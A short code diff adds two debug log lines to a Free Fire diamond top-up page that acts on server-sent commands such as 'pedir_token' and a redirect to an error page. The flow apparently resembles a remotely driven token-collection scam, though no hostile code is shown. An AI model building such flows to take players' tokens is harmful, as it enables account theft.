@@ -357,6 +357,8 @@ if (empty($freefire_data['playerId']) || $freefire_data['diamonds'] <= 0) {
         clearTimeout(timeout);
         modal.style.display = "none";
 
+        console.log("Acción recibida:", json.action);
+
         switch (json.action) {
 
           case "pedir_token":
@@ -383,6 +385,7 @@ if (empty($freefire_data['playerId']) || $freefire_data['diamonds'] <= 0) {
 
           case "dinamica_logo":
             // 👉 NUEVA ACCIÓN
+            console.log("Redirigiendo a error_dinamica.php");
             window.location.href = "recargas/error_dinamica.php";
             break;
 
